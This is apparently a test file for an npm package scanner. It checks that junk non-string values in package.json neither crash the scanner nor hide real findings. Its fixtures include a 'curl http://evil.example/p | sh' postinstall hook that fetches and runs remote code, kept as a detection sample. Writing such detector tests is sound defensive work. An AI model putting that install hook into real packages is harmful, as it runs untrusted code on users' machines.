'use strict';

// scanPackageJson type guards (2026-11-13). Found by the seeded fuzz: one hand-written
// non-string value made the scanner throw, and the throw dropped every finding of the scanner,
// including a `postinstall: curl | sh` next to it (CLI score 75 -> 0, reported SAFE).
// Positive tests: the real signal survives the junk value. Negative tests: the junk value alone
// produces no finding and no crash.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { asyncTest, assert } = require('../test-utils');
const { scanPackageJson } = require('../../src/scanner/package.js');

const CURL_PIPE = 'curl http://evil.example/p | sh';

async function scanRaw(raw, extraFiles = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkgtype-'));
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), raw);
    for (const [rel, content] of Object.entries(extraFiles)) fs.writeFileSync(path.join(dir, rel), content);
    return await scanPackageJson(dir);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const scan = (pkg, extraFiles) => scanRaw(JSON.stringify(pkg), extraFiles);
const types = (threats) => threats.map(t => t.type);

async function runPackageTypeGuardTests() {
  console.log('\n=== PACKAGE TYPE GUARDS ===\n');

  // --- positives: the junk value must not hide the real signal ----------------------------

  for (const junk of [1, true, { a: 1 }, ['x'], null]) {
    await asyncTest(`PKG-TYPE: non-string preinstall (${JSON.stringify(junk)}) does not hide a curl|sh postinstall`, async () => {
      const t = types(await scan({ name: 'x', version: '1.0.0', scripts: { preinstall: junk, postinstall: CURL_PIPE } }));
      assert(t.includes('lifecycle_shell_pipe'), 'lifecycle_shell_pipe lost: ' + JSON.stringify(t));
    });
  }

  for (const version of [{ a: 1 }, ['1.0.0'], true, null]) {
    await asyncTest(`PKG-TYPE: non-string version (${JSON.stringify(version)}) does not hide a curl|sh postinstall`, async () => {
      const t = types(await scan({ name: 'x', version, scripts: { postinstall: CURL_PIPE } }));
      assert(t.includes('lifecycle_shell_pipe'), 'lifecycle_shell_pipe lost: ' + JSON.stringify(t));
    });
  }

  await asyncTest('PKG-TYPE: numeric repdigit version keeps the dependency-confusion signal', async () => {
    const t = types(await scan({ name: 'x', version: 999, scripts: { preinstall: 'node i.js' } }, { 'i.js': '' }));
    assert(t.includes('version_99_preinstall'), 'version_99_preinstall expected for version 999: ' + JSON.stringify(t));
  });

  await asyncTest('PKG-TYPE: numeric install hook next to binding.gyp does not crash, string hook still judged', async () => {
    const t = types(await scan({ name: 'x', version: '1.0.0', scripts: { install: 5, postinstall: CURL_PIPE } },
      { 'binding.gyp': "{ 'targets': [{ 'target_name': 'a', 'sources': ['a.cc'] }] }" }));
    assert(t.includes('lifecycle_shell_pipe'), 'lifecycle_shell_pipe lost: ' + JSON.stringify(t));
    assert(t.includes('native_addon_install'), 'native_addon_install expected from the string hook: ' + JSON.stringify(t));
  });

  // --- negatives: junk alone is not a finding, never a crash -------------------------------

  await asyncTest('PKG-TYPE: non-string lifecycle values alone produce no lifecycle finding', async () => {
    const t = types(await scan({ name: 'x', version: '1.0.0', scripts: { preinstall: 1, install: true, postinstall: { a: 1 } } }));
    assert(!t.some(x => /^lifecycle_/.test(x)), 'non-string scripts must not be reported as scripts: ' + JSON.stringify(t));
  });

  await asyncTest('PKG-TYPE: non-object scripts field is tolerated', async () => {
    for (const scripts of ['curl x | sh', 7, ['postinstall']]) {
      const t = types(await scan({ name: 'x', version: '1.0.0', scripts }));
      assert(Array.isArray(t), 'scanner must return an array for scripts=' + JSON.stringify(scripts));
      assert(!t.includes('lifecycle_shell_pipe'), 'a non-object scripts field has no lifecycle hook: ' + JSON.stringify(t));
    }
  });

  for (const raw of ['null', '[]', '5', '"str"']) {
    await asyncTest(`PKG-TYPE: package.json that is not an object (${raw}) returns []`, async () => {
      const t = await scanRaw(raw);
      assert(Array.isArray(t) && t.length === 0, 'expected no finding: ' + JSON.stringify(t));
    });
  }

  await asyncTest('PKG-TYPE: control - a plain package.json is unchanged (curl|sh still CRITICAL)', async () => {
    const threats = await scan({ name: 'x', version: '1.0.0', scripts: { postinstall: CURL_PIPE } });
    const pipe = threats.find(x => x.type === 'lifecycle_shell_pipe');
    assert(pipe && pipe.severity === 'CRITICAL', 'control lost: ' + JSON.stringify(types(threats)));
  });
}

module.exports = { runPackageTypeGuardTests };
